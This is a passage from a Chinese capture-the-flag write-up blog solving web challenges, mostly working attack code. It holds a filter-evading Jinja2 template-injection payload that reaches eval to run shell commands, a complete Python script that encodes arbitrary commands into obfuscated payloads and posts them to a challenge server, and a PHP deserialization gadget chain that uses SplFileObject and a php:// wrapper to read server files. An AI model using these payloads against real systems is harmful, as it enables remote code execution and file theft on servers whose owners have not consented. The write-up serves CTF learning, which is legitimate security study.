<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> pld <span class="token operator">=</span> xhx<span class="token operator">~</span>xhx<span class="token operator">~</span>imp<span class="token operator">~</span>xhx<span class="token operator">~</span>xhx<span class="token operator">~</span>left<span class="token operator">~</span>yin<span class="token operator">~</span>so<span class="token operator">~</span>yin<span class="token operator">~</span>right<span class="token operator">~</span>point<span class="token operator">~</span>pon<span class="token operator">~</span>left<span class="token operator">~</span>yin<span class="token operator">~</span>ca<span class="token operator">~</span>space<span class="token operator">~</span>slas<span class="token operator">~</span>flg<span class="token operator">~</span>yin<span class="token operator">~</span>right<span class="token operator">~</span>point<span class="token operator">~</span>red<span class="token operator">~</span>left<span class="token operator">~</span>right <span class="token operator">%</span><span class="token punctuation">&#125;</span>

<span class="token comment"># 然后将上面构造的各种变量添加到SSTI万能payload里面就行了: </span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> f<span class="token punctuation">,</span>v <span class="token keyword">in</span> <span class="token punctuation">(</span>whoami<span class="token operator">|</span>attr<span class="token punctuation">(</span>xhx<span class="token operator">~</span>xhx<span class="token operator">~</span>ini<span class="token operator">~</span>xhx<span class="token operator">~</span>xhx<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>xhx<span class="token operator">~</span>xhx<span class="token operator">~</span>glo<span class="token operator">~</span>xhx<span class="token operator">~</span>xhx<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>itm<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># globals</span>
    <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> f <span class="token operator">==</span> bul <span class="token operator">%</span><span class="token punctuation">&#125;</span> 
        <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> a<span class="token punctuation">,</span>b <span class="token keyword">in</span> <span class="token punctuation">(</span>v<span class="token operator">|</span>attr<span class="token punctuation">(</span>itm<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># builtins</span>
            <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> a <span class="token operator">==</span> ev <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># eval</span>
                <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>b<span class="token punctuation">(</span>pld<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    <span class="token comment"># eval("__import__('os').popen('cat /flag').read()")</span>
                <span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>还有一个大佬写的脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">></span><span class="token keyword">from</span> typing <span class="token keyword">import</span> List

<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://node6.anna.nssctf.cn:28298/get_flag"</span><span class="token comment">#记得改地址</span>

<span class="token keyword">def</span> <span class="token function">build_number</span><span class="token punctuation">(</span>num<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>
	result<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
	index<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">0</span>
	<span class="token keyword">while</span> num <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
		n<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> num <span class="token operator">%</span> <span class="token number">10</span>
		result<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>num2var<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token string">'*ten'</span><span class="token operator">*</span>index<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span><span class="token punctuation">)</span>
		num <span class="token operator">//=</span> <span class="token number">10</span>
		index <span class="token operator">+=</span> <span class="token number">1</span>
	<span class="token keyword">return</span> <span class="token string">"+"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>result<span class="token punctuation">)</span>


num2var_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
	<span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">"zero"</span><span class="token punctuation">,</span>
	<span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">"one"</span><span class="token punctuation">,</span>
	<span class="token number">2</span><span class="token punctuation">:</span> <span class="token string">"two"</span><span class="token punctuation">,</span>
	<span class="token number">3</span><span class="token punctuation">:</span> <span class="token string">"three"</span><span class="token punctuation">,</span>
	<span class="token number">4</span><span class="token punctuation">:</span> <span class="token string">"four"</span><span class="token punctuation">,</span>
	<span class="token number">5</span><span class="token punctuation">:</span> <span class="token string">"five"</span><span class="token punctuation">,</span>
	<span class="token number">6</span><span class="token punctuation">:</span> <span class="token string">"six"</span><span class="token punctuation">,</span>
	<span class="token number">7</span><span class="token punctuation">:</span> <span class="token string">"seven"</span><span class="token punctuation">,</span>
	<span class="token number">8</span><span class="token punctuation">:</span> <span class="token string">"eight"</span><span class="token punctuation">,</span>
	<span class="token number">9</span><span class="token punctuation">:</span> <span class="token string">"nine"</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">def</span> <span class="token function">num2var</span><span class="token punctuation">(</span>num<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>
	<span class="token keyword">if</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">:</span>
		<span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"no way"</span><span class="token punctuation">)</span>
	<span class="token keyword">return</span> num2var_dict<span class="token punctuation">[</span>num<span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">build_payload</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>
	<span class="token keyword">return</span> <span class="token triple-quoted-string string">"""&#123;% set one=(a,)|length %&#125;
&#123;% set zero=one-one %&#125;
&#123;% set two=one+one %&#125;
&#123;% set three=one+two %&#125;
&#123;% set four=two*two %&#125;
&#123;% set five=three+two %&#125;
&#123;% set six=three*two %&#125;
&#123;% set seven=one+six %&#125;
&#123;% set eight=four*two %&#125;
&#123;% set nine=one+eight %&#125;
&#123;% set ten=five*two %&#125;
&#123;% set pops=dict(p=a,op=a)|join %&#125;
&#123;% set lo=(x|reject|string|list)|attr(pops)("""</span> <span class="token operator">+</span> build_number<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")%&#125;
&#123;% set init=(lo,lo,dict(ini=a,t=a)|join,lo,lo)|join %&#125;
&#123;% set cc=(lo,lo,dict(glo=a,bals=a)|join,lo,lo)|join %&#125;
&#123;% set ccc=(lo,lo,dict(get=a,item=a)|join,lo,lo)|join %&#125;
&#123;% set cccc=(lo,lo,dict(buil=a,tins=a)|join,lo,lo)|join %&#125;
&#123;% set evas=dict(ev=a,al=a)|join %&#125;
&#123;% set chs=dict(ch=a,r=a)|join %&#125;
&#123;% set chr=a|attr(init)|attr(cc)|attr(ccc)(cccc)|attr(ccc)(chs)%&#125;
&#123;% set eval=a|attr(init)|attr(cc)|attr(ccc)(cccc)|attr(ccc)(evas) %&#125;
&#123;% print(eval(("""</span> <span class="token operator">+</span> <span class="token string">","</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"chr(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>build_number<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string-interpolation"><span class="token string">f"__import__('os').popen('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">').read()"</span></span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")|join)) %&#125;"""</span>


<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>
	payload <span class="token operator">=</span> build_payload<span class="token punctuation">(</span>command<span class="token punctuation">)</span>
	response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
	<span class="token comment">#return re.findall(f"h3>(.*?)&lt;/h3", response.text, re.S)[0].strip()</span>

c <span class="token operator">=</span> <span class="token string">'cat /flag'</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>run<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="泄露的伪装"><a href="#泄露的伪装" class="headerlink" title="泄露的伪装"></a>泄露的伪装</h3><p><img src="https://img-blog.csdnimg.cn/4da968b7349444ea8c30fc873afc897b.png" alt="2"><br>主界面也没啥，扫一下目录。<br><img src="https://img-blog.csdnimg.cn/c3c7b6d968f244bc82946f267069f729.png" alt="2"><br>访问test.txt<br><img src="https://img-blog.csdnimg.cn/70c0495b610441e1b57c98ffdc32e62a.png" alt="3"><br>知道源码但要找到对应的php文件。<br>访问<a target="_blank" rel="noopener" href="http://www.rar得到路径/">www.rar得到路径</a><br><img src="https://img-blog.csdnimg.cn/0fe65ed76dc94d7e8465f8d472870158.png" alt="6"><br>burp抓包伪协议读取<br><img src="https://img-blog.csdnimg.cn/2dd20719f6054e4b8b4d753112d67505.png" alt="7"></p>
<h3 id="反方向的钟"><a href="#反方向的钟" class="headerlink" title="反方向的钟"></a>反方向的钟</h3><p>反序列化</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// flag.php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">teacher</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$rank</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$salary</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$rank</span><span class="token punctuation">,</span><span class="token variable">$salary</span> <span class="token operator">=</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">rank</span> <span class="token operator">=</span> <span class="token variable">$rank</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">salary</span> <span class="token operator">=</span> <span class="token variable">$salary</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">classroom</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$leader</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$leader</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span> <span class="token operator">=</span> <span class="token variable">$leader</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">hahaha</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'one class'</span> <span class="token keyword">or</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'ing'</span> <span class="token keyword">or</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span><span class="token operator">-></span><span class="token property">rank</span> <span class="token operator">!=</span><span class="token string single-quoted-string">'department'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">school</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$department</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$headmaster</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$department</span><span class="token punctuation">,</span><span class="token variable">$ceo</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">department</span> <span class="token operator">=</span> <span class="token variable">$department</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">headmaster</span> <span class="token operator">=</span> <span class="token variable">$ceo</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">IPO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">headmaster</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'ong'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Pretty Good ! Ctfer!\n"</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">department</span><span class="token operator">-></span><span class="token function">hahaha</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">IPO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>说存在flag.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">classroom</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$leader</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$leader</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span> <span class="token operator">=</span> <span class="token variable">$leader</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">hahaha</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'one class'</span> <span class="token keyword">or</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'ing'</span> <span class="token keyword">or</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span><span class="token operator">-></span><span class="token property">rank</span> <span class="token operator">!=</span><span class="token string single-quoted-string">'department'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>成立条件：<code>name=&quot;one class&quot;,leader=&quot;ing&quot;,rank=&quot;department&quot;</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">school</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$department</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$headmaster</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$department</span><span class="token punctuation">,</span><span class="token variable">$ceo</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">department</span> <span class="token operator">=</span> <span class="token variable">$department</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">headmaster</span> <span class="token operator">=</span> <span class="token variable">$ceo</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">IPO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">headmaster</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'ong'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Pretty Good ! Ctfer!\n"</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>成立条件：<code>headmaster=&quot;ong&quot;</code><strong>a传入一个方法，b传入命令</strong>，php内置方法<strong>SplFileObject</strong>可以读取文件，b传入伪协议读取flag.php文件。<br>构造代码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// flag.php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">teacher</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$rank</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span><span class="token string single-quoted-string">'ing'</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">rank</span> <span class="token operator">=</span><span class="token string single-quoted-string">'department'</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">classroom</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$leader</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span><span class="token string single-quoted-string">'one class'</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span> <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">teacher</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">school</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$department</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$headmaster</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">department</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">classroom</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">headmaster</span> <span class="token operator">=</span><span class="token string single-quoted-string">'ong'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">school</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>解码得到flag<br><img src="https://img-blog.csdnimg.cn/5ffb75187dbc42149eb9443b38b8d876.png" alt="2"></p>

        
        <br />
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>
        <div id="lv-container"></div>
        <div class="giscus"></div>
    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <span id="busuanzi_container_site_pv">
            <span id="busuanzi_value_site_pv"></span>PV
        </span>
        <span id="busuanzi_container_site_uv">
            <span id="busuanzi_value_site_uv"></span>UV
        </span>
        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = "search.xml"
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>

<script src="/js/index.js"></script>

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>






</html>
